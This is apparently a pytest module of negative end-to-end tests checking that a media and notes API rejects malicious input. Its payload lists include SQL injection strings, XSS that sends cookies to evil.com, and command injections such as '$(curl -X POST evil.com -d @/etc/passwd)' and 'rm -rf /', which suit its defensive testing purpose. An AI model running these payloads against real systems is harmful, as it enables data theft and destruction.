"""
Negative Test Scenarios for E2E Testing
----------------------------------------

This module contains comprehensive negative test cases to ensure the API
properly handles invalid inputs, malicious requests, and error conditions.

Test Categories:
1. Authentication & Authorization
2. Input Validation & Injection
3. Resource Limits & Boundaries
4. File Upload Security
5. Data Corruption & Malformed Requests
"""

import pytest
import httpx
import os
import json
import tempfile
import random
import string
from pathlib import Path
from typing import Dict, Any, List

from fixtures import (
    api_client, authenticated_client, data_tracker, test_user_credentials,
    create_test_file, cleanup_test_file,
    SmartErrorHandler, BASE_URL, API_PREFIX
)
from test_data import TestDataGenerator


class TestAuthenticationNegative:
    """Test authentication and authorization negative scenarios."""
    
    def test_missing_api_key(self, api_client):
        """Test requests without authentication headers."""
        # Remove all auth headers
        original_headers = api_client.client.headers.copy()
        api_client.client.headers.clear()
        
        try:
            # Attempt to access protected endpoint
            with pytest.raises(httpx.HTTPStatusError) as exc_info:
                api_client.get_media_list()
            
            assert exc_info.value.response.status_code in [401, 403], \
                f"Expected 401/403, got {exc_info.value.response.status_code}"
        finally:
            # Restore headers
            api_client.client.headers = original_headers
    
    def test_invalid_api_key_format(self, api_client):
        """Test various invalid API key formats."""
        invalid_keys = [
            "",  # Empty string
            " ",  # Whitespace only
            "12345",  # Too short
            "not-a-valid-key!@#$%",  # Special characters
            "a" * 1000,  # Extremely long
            "\x00\x01\x02",  # Binary data
            "'; DROP TABLE users; --",  # SQL injection attempt
            "../../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # XSS attempt
        ]
        
        original_headers = api_client.client.headers.copy()
        
        for invalid_key in invalid_keys:
            api_client.client.headers["X-API-KEY"] = invalid_key
            api_client.client.headers["Token"] = invalid_key
            
            try:
                # Use a protected endpoint instead of health check
                api_client.get_media_list()
                # Should not reach here
                pytest.fail(f"Invalid key '{invalid_key[:20]}...' was accepted but should be rejected")
            except (httpx.HTTPStatusError, httpx.LocalProtocolError) as exc_info:
                # Should get 401 for invalid authentication or protocol error for invalid headers
                if isinstance(exc_info, httpx.HTTPStatusError):
                    assert exc_info.response.status_code in [400, 401, 403], \
                        f"Invalid key '{invalid_key[:20]}...' should be rejected with 401/403, got {exc_info.response.status_code}"
                # httpx.LocalProtocolError is also acceptable for malformed headers
        
        # Restore headers
        api_client.client.headers = original_headers
    
    def test_expired_token_handling(self, api_client):
        """Test handling of expired JWT tokens (multi-user mode)."""
        # Check if we're in single-user mode (API key auth)
        if "X-API-KEY" in api_client.client.headers:
            pytest.skip("JWT tests not applicable in single-user mode")
        
        # This would need a way to generate an expired token
        # For now, test with malformed JWT
        malformed_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.corrupted.signature"
        
        original_headers = api_client.client.headers.copy()
        api_client.client.headers["Authorization"] = f"Bearer {malformed_jwt}"
        
        try:
            # Try to access protected endpoint with malformed JWT
            api_client.get_media_list()
            pytest.fail("Malformed JWT should be rejected")
        except httpx.HTTPStatusError as exc_info:
            assert exc_info.response.status_code in [401, 403]
        finally:
            api_client.client.headers = original_headers
    
    def test_concurrent_login_attempts(self, api_client):
        """Test multiple simultaneous login attempts with same credentials."""
        # Skip in single-user mode as there's no login endpoint
        if "X-API-KEY" in api_client.client.headers:
            pytest.skip("Login tests not applicable in single-user mode")
            
        # Generate test credentials
        user_data = TestDataGenerator.generate_test_user()
        
        import concurrent.futures
        import threading
        
        results = []
        errors = []
        lock = threading.Lock()
        
        def attempt_login():
            try:
                response = api_client.login(
                    username=user_data["username"],
                    password=user_data["password"]
                )
                with lock:
                    results.append(response)
            except Exception as e:
                with lock:
                    errors.append(str(e))
        
        # Attempt 10 concurrent logins
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(attempt_login) for _ in range(10)]
            concurrent.futures.wait(futures)
        
        # At least some should fail or be rate limited
        assert len(errors) > 0 or len(set(r.get("token") for r in results)) > 1, \
            "Concurrent logins should be handled properly"
    
    def test_authorization_header_injection(self, api_client):
        """Test authorization header injection attempts."""
        # Skip in single-user mode as it uses API keys
        if "X-API-KEY" in api_client.client.headers:
            pytest.skip("Authorization header tests not applicable in single-user mode")
            
        injection_attempts = [
            "Bearer token1 Bearer token2",  # Double bearer
            "Basic YWRtaW46YWRtaW4=",  # Basic auth attempt
            "Bearer\nBearer real_token",  # Newline injection
            "Bearer token; admin=true",  # Parameter injection
            "Bearer token\r\nX-Admin: true",  # Header injection
        ]
        
        original_headers = api_client.client.headers.copy()
        
        for injection in injection_attempts:
            api_client.client.headers["Authorization"] = injection
            
            try:
                api_client.get_media_list()
                pytest.fail(f"Header injection '{injection[:30]}...' should be rejected")
            except httpx.HTTPStatusError as exc_info:
                assert exc_info.response.status_code in [400, 401, 403]
        
        api_client.client.headers = original_headers


class TestMediaUploadNegative:
    """Test media upload negative scenarios."""
    
    def test_upload_oversized_file(self, authenticated_client, data_tracker):
        """Test uploading file exceeding size limits."""
        # Create a large file (simulate 1GB)
        large_file = tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
        data_tracker.add_file(large_file.name)
        
        try:
            # Write 101MB of data (exceeds 100MB limit)
            chunk = b"x" * (1024 * 1024)  # 1MB chunk
            for _ in range(101):
                large_file.write(chunk)
            large_file.close()
            
            # Attempt upload
            try:
                result = authenticated_client.upload_media(
                    file_path=large_file.name,
                    title="Oversized File",
                    media_type="document"
                )
                print(f"Upload succeeded unexpectedly with result: {result}")
                pytest.fail("Oversized file should be rejected with 413 error")
            except httpx.HTTPStatusError as exc_info:
                # Should reject with 413 or 400
                assert exc_info.response.status_code in [400, 413], \
                    f"Oversized file should be rejected with 413/400, got {exc_info.response.status_code}"
                
        finally:
            cleanup_test_file(large_file.name)
    
    def test_upload_invalid_file_types(self, authenticated_client):
        """Test uploading potentially dangerous file types."""
        dangerous_extensions = [
            (".exe", b"MZ\x90\x00"),  # Windows executable
            (".bat", b"@echo off\nformat c:"),  # Batch file
            (".sh", b"#!/bin/bash\nrm -rf /"),  # Shell script
            (".dll", b"MZ"),  # DLL file
            (".app", b"malicious"),  # Application
            (".scr", b"screensaver"),  # Screensaver (executable)
        ]
        
        for ext, content in dangerous_extensions:
            with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
                f.write(content)
                temp_file = f.name
            
            try:
                with pytest.raises(httpx.HTTPStatusError) as exc_info:
                    authenticated_client.upload_media(
                        file_path=temp_file,
                        title=f"Dangerous file {ext}",
                        media_type="document"
                    )
                
                # Should reject with 400 or 415
                assert exc_info.value.response.status_code in [400, 415], \
                    f"File type {ext} should be rejected"
            finally:
                cleanup_test_file(temp_file)
    
    def test_upload_corrupted_files(self, authenticated_client):
        """Test uploading corrupted files of various types."""
        corrupted_files = [
            # Corrupted PDF (invalid header)
            (".pdf", b"NOT_A_PDF_HEADER\x00\x00"),
            # Corrupted MP3 (invalid frame)
            (".mp3", b"\xFF\xFF\xFF\xFF"),
            # Corrupted ZIP
            (".zip", b"XX\x00\x00corrupted"),
            # Truncated video file
            (".mp4", b"ftypmp4truncated"),
        ]
        
        for ext, content in corrupted_files:
            with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
                f.write(content)
                temp_file = f.name
            
            try:
                # Upload might succeed but processing should fail
                response = authenticated_client.upload_media(
                    file_path=temp_file,
                    title=f"Corrupted {ext}",
                    media_type="document"
                )
                
                # Check if error is reported in response
                if "results" in response:
                    result = response["results"][0]
                    assert result.get("status") == "Error" or result.get("error"), \
                        f"Corrupted {ext} should report error"
                        
            except httpx.HTTPStatusError:
                # Also acceptable to reject at upload
                pass
            finally:
                cleanup_test_file(temp_file)
    
    def test_upload_malicious_filenames(self, authenticated_client):
        """Test uploading files with malicious filenames."""
        malicious_names = [
            "../../../etc/passwd",  # Path traversal
            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows path traversal
            "file\x00.txt",  # Null byte injection
            "file%00.txt",  # URL encoded null byte
            "file;rm -rf /.txt",  # Command injection
            "file|whoami.txt",  # Pipe command
            "file`id`.txt",  # Backtick command
            "file$(curl evil.com).txt",  # Command substitution
            "file\nNewline.txt",  # Newline in filename
            "file\r\nCarriageReturn.txt",  # CRLF injection
            "." * 300 + ".txt",  # Extremely long extension
            "\x00\x01\x02.txt",  # Binary in filename
        ]
        
        content = b"Test content"
        
        for malicious_name in malicious_names:
            # Create file with normal name, but send with malicious name
            with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
                f.write(content)
                temp_file = f.name
            
            try:
                # Override the filename in the request
                with open(temp_file, "rb") as f:
                    files = {"files": (malicious_name, f, "text/plain")}
                    data = {
                        "title": "Test",
                        "media_type": "document",
                        "overwrite_existing": "true"
                    }
                    
                    response = authenticated_client.client.post(
                        f"{API_PREFIX}/media/add",
                        files=files,
                        data=data
                    )
                    
                    # Should sanitize the filename or reject
                    if response.status_code == 200:
                        result = response.json()
                        # Verify the stored filename is sanitized
                        if "results" in result:
                            stored_name = result["results"][0].get("filename", "")
                            assert malicious_name not in stored_name, \
                                f"Malicious filename should be sanitized"
                                
            except httpx.HTTPStatusError as e:
                # Rejection is also acceptable
                assert e.response.status_code in [400, 422]
            finally:
                cleanup_test_file(temp_file)
    
    def test_upload_empty_file(self, authenticated_client):
        """Test uploading empty files."""
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
            # Don't write anything - empty file
            temp_file = f.name
        
        try:
            with pytest.raises(httpx.HTTPStatusError) as exc_info:
                authenticated_client.upload_media(
                    file_path=temp_file,
                    title="Empty File",
                    media_type="document"
                )
            
            # Should reject empty files
            assert exc_info.value.response.status_code in [400, 422]
        finally:
            cleanup_test_file(temp_file)
    
    def test_upload_without_required_fields(self, authenticated_client):
        """Test uploading without required fields."""
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
            f.write(b"Test content")
            temp_file = f.name
        
        try:
            # Missing title
            with open(temp_file, "rb") as f:
                files = {"files": ("test.txt", f, "text/plain")}
                data = {"media_type": "document"}  # No title
                
                response = authenticated_client.client.post(
                    f"{API_PREFIX}/media/add",
                    files=files,
                    data=data
                )
                
                # Might auto-generate title or reject
                if response.status_code != 200:
                    assert response.status_code in [400, 422]
                    
        finally:
            cleanup_test_file(temp_file)


class TestDataValidationNegative:
    """Test data validation and injection prevention."""
    
    def test_sql_injection_in_search(self, authenticated_client):
        """Test SQL injection attempts in search queries."""
        sql_injections = [
            "'; DROP TABLE media; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DELETE FROM media WHERE '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') AND ''='",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ]
        
        for injection in sql_injections:
            try:
                response = authenticated_client.search_media(injection)
                
                # Should return empty results or sanitized query
                if "results" in response:
                    # Verify no actual SQL was executed
                    assert isinstance(response["results"], list), \
                        "Search should return list even with injection"
                    
                    # Check that the system is still functioning
                    health = authenticated_client.health_check()
                    assert health["status"] == "healthy", \
                        "System should remain healthy after injection attempt"
                        
            except httpx.HTTPStatusError as e:
                # Rejection is also acceptable
                assert e.response.status_code in [400, 422]
    
    def test_xss_in_note_content(self, authenticated_client, data_tracker):
        """Test XSS attempts in note content."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "';alert(String.fromCharCode(88,83,83))//",
        ]
        
        for payload in xss_payloads:
            try:
                response = authenticated_client.create_note(
                    title=f"XSS Test {payload[:20]}",
                    content=payload,
                    keywords=["test", "xss"]
                )
                
                # Note might be created but content should be sanitized
                if "id" in response or "note_id" in response:
                    note_id = response.get("id") or response.get("note_id")
                    data_tracker.add_note(note_id)
                    
                    # Retrieve and verify sanitization
                    notes = authenticated_client.get_notes()
                    # Content should be escaped or sanitized
                    
            except httpx.HTTPStatusError as e:
                # Rejection is acceptable
                assert e.response.status_code in [400, 422]
    
    def test_command_injection_in_prompts(self, authenticated_client, data_tracker):
        """Test command injection in prompt content."""
        command_injections = [
            "$(whoami)",
            "`id`",
            "; ls -la /",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "|| curl evil.com",
            "$(curl -X POST evil.com -d @/etc/passwd)",
            "`python -c 'import os; os.system(\"ls\")'`",
        ]
        
        for injection in command_injections:
            prompt_content = f"Summarize this: {injection}"
            
            try:
                response = authenticated_client.create_prompt(
                    name=f"Injection Test {injection[:10]}",
                    content=prompt_content,
                    description="Test prompt"
                )
                
                if "id" in response or "prompt_id" in response:
                    prompt_id = response.get("id") or response.get("prompt_id")
                    data_tracker.add_prompt(prompt_id)
                    
                    # Commands should not be executed
                    # System should remain stable
                    health = authenticated_client.health_check()
                    assert health["status"] == "healthy"
                    
            except httpx.HTTPStatusError as e:
                # Rejection is acceptable
                pass
    
    def test_unicode_edge_cases(self, authenticated_client):
        """Test Unicode edge cases and encoding issues."""
        unicode_tests = [
            "\u0000",  # Null character
            "\ufeff",  # Zero-width no-break space
            "\u200b\u200c\u200d",  # Zero-width spaces
            "\U0001f4a9",  # Emoji
            "\u0301" * 100,  # Combining diacritical marks
            "A" + "\u0301" * 50,  # Zalgo text
            "\uffff",  # Noncharacter
            "\U00100000",  # Supplementary plane
            "𠜎𠜱𡿺𢌱𥄫𦉘𦟌𦧲",  # Complex CJK
            "\u202e\u202d",  # Right-to-left override
        ]
        
        for unicode_str in unicode_tests:
            try:
                response = authenticated_client.create_note(
                    title="Unicode Test",
                    content=f"Testing: {unicode_str}",
                    keywords=["unicode", "test"]
                )
                
                # Should handle gracefully
                if "id" in response or "note_id" in response:
                    note_id = response.get("id") or response.get("note_id")
                    
                    # Verify retrieval works
                    notes = authenticated_client.get_notes()
                    
            except httpx.HTTPStatusError as e:
                # Some Unicode might be rejected
                assert e.response.status_code in [400, 422]
    
    def test_json_bomb(self, authenticated_client):
        """Test JSON bomb/billion laughs attack."""
        # Create deeply nested JSON
        json_bomb = {"a": ["b"]}
        for _ in range(100):
            json_bomb = {"a": [json_bomb]}
        
        try:
            response = authenticated_client.client.post(
                f"{API_PREFIX}/notes/",
                json={
                    "title": "JSON Bomb Test",
                    "content": json.dumps(json_bomb),
                    "keywords": ["test"]
                }
            )
            
            # Should reject deep nesting or accept gracefully
            if response.status_code in [200, 201]:
                # Accepted - verify system still responsive
                health = authenticated_client.health_check()
                assert health["status"] == "healthy"
                # This is acceptable if server can handle it
                pytest.skip("Server accepts deeply nested JSON - which is fine if it handles it gracefully")
            else:
                # Rejection is good
                assert response.status_code in [400, 413, 422]
                
        except httpx.HTTPStatusError as e:
            # Expected to reject
            assert e.response.status_code in [400, 413, 422]
    
    def test_header_injection(self, authenticated_client):
        """Test HTTP header injection attempts."""
        injection_headers = [
            ("X-Custom\r\nX-Admin: true", "value"),
            ("X-Test", "value\r\nX-Admin: true"),
            ("X-Inject\nContent-Length: 0", "value"),
            ("X-Test", "value\nSet-Cookie: admin=true"),
        ]
        
        original_headers = authenticated_client.client.headers.copy()
        
        for header_name, header_value in injection_headers:
            try:
                authenticated_client.client.headers[header_name] = header_value
                response = authenticated_client.health_check()
                
                # Should not process injected headers
                # Verify no admin access granted
                
            except (httpx.HTTPStatusError, httpx.InvalidURL, ValueError, httpx.LocalProtocolError):
                # Rejection is expected - httpx validates headers
                pass
            finally:
                authenticated_client.client.headers = original_headers


class TestResourceLimitsNegative:
    """Test resource limits and boundary conditions."""
    
    def test_exceed_rate_limits(self, authenticated_client):
        """Test exceeding API rate limits."""
        import time
        
        # Make rapid requests
        errors_429 = 0
        for i in range(100):
            try:
                authenticated_client.health_check()
                if i % 10 == 0:
                    time.sleep(0.01)  # Small delay every 10 requests
            except httpx.HTTPStatusError as e:
                if e.response.status_code == 429:
                    errors_429 += 1
                    # Rate limiting is working
                    break
        
        # Should hit rate limit at some point (if implemented)
        # If not implemented, that's also worth noting
        if errors_429 == 0:
            print("Warning: No rate limiting detected after 100 rapid requests")
    
    def test_maximum_field_lengths(self, authenticated_client):
        """Test maximum field length boundaries."""
        # Test various field length limits
        long_string = "x" * 100000  # 100K characters
        
        test_cases = [
            # Note with extremely long title
            {
                "endpoint": "notes",
                "data": {
                    "title": long_string,
                    "content": "Normal content"
                }
            },
            # Prompt with extremely long content
            {
                "endpoint": "prompts",
                "data": {
                    "name": "Test",
                    "content": long_string
                }
            },
            # Search with extremely long query
            {
                "endpoint": "search",
                "query": long_string
            }
        ]
        
        for test in test_cases:
            if test.get("endpoint") == "search":
                try:
                    response = authenticated_client.search_media(test["query"])
                    # Should truncate or reject
                except httpx.HTTPStatusError as e:
                    assert e.response.status_code in [400, 414, 422]
            else:
                try:
                    response = authenticated_client.client.post(
                        f"{API_PREFIX}/{test['endpoint']}/",
                        json=test["data"]
                    )
                    # Should truncate or reject
                    if response.status_code != 200:
                        assert response.status_code in [400, 413, 422]
                except httpx.HTTPStatusError as e:
                    assert e.response.status_code in [400, 413, 422]
    
    def test_create_excessive_resources(self, authenticated_client, data_tracker):
        """Test creating excessive number of resources."""
        # Try to create many notes rapidly
        created_count = 0
        failed_count = 0
        
        for i in range(1000):
            try:
                response = authenticated_client.create_note(
                    title=f"Bulk Note {i}",
                    content=f"Content {i}",
                    keywords=[f"bulk{i}"]
                )
                
                if "id" in response or "note_id" in response:
                    note_id = response.get("id") or response.get("note_id")
                    data_tracker.add_note(note_id)
                    created_count += 1
                    
            except httpx.HTTPStatusError as e:
                failed_count += 1
                if e.response.status_code in [429, 507]:  # Rate limit or storage full
                    break
                    
            # Stop if we start hitting limits
            if failed_count > 10:
                break
        
        # Should have some limit on resource creation
        assert created_count < 1000, "Should have limits on bulk resource creation"
        
        # Clean up
        print(f"Created {created_count} notes, {failed_count} failed")
    
    def test_integer_overflow(self, authenticated_client):
        """Test integer overflow conditions."""
        overflow_values = [
            2**31 - 1,  # Max 32-bit signed
            2**31,  # Overflow 32-bit signed
            2**63 - 1,  # Max 64-bit signed
            2**63,  # Overflow 64-bit signed
            -2**31,  # Min 32-bit signed
            -2**63,  # Min 64-bit signed
            float('inf'),  # Infinity
            float('-inf'),  # Negative infinity
            float('nan'),  # Not a number
        ]
        
        for value in overflow_values:
            try:
                # Try with limit parameter
                response = authenticated_client.client.get(
                    f"{API_PREFIX}/media/",
                    params={"limit": value, "offset": 0}
                )
                
                # Should handle gracefully
                if response.status_code == 200:
                    result = response.json()
                    # Verify reasonable limit was applied
                    if "items" in result:
                        assert len(result["items"]) <= 1000, \
                            "Should apply reasonable limit"
                else:
                    assert response.status_code in [400, 422]
                    
            except (httpx.HTTPStatusError, ValueError, TypeError):
                # Expected to reject invalid values
                pass
    
    def test_negative_values(self, authenticated_client):
        """Test negative values where not expected."""
        test_cases = [
            ("limit", -1),
            ("offset", -100),
            ("temperature", -1.0),
        ]
        
        for param, value in test_cases:
            try:
                if param in ["limit", "offset"]:
                    response = authenticated_client.client.get(
                        f"{API_PREFIX}/media/",
                        params={param: value}
                    )
                elif param == "temperature":
                    # Test negative temperature
                    response = authenticated_client.client.post(
                        f"{API_PREFIX}/chat/completions",
                        json={
                            "messages": [{"role": "user", "content": "Test"}],
                            "model": "gpt-3.5-turbo",
                            "temperature": value
                        }
                    )
                
                # Should reject negative values or use defaults
                if hasattr(response, 'status_code'):
                    if response.status_code == 200:
                        # If accepted, verify it used reasonable defaults
                        pass
                    else:
                        assert response.status_code in [400, 422]
                    
            except httpx.HTTPStatusError as e:
                assert e.response.status_code in [400, 422]


# Test markers would be defined in pytest.ini or pyproject.toml
# For now, commenting out to avoid errors
# pytest.mark.negative = pytest.mark.negative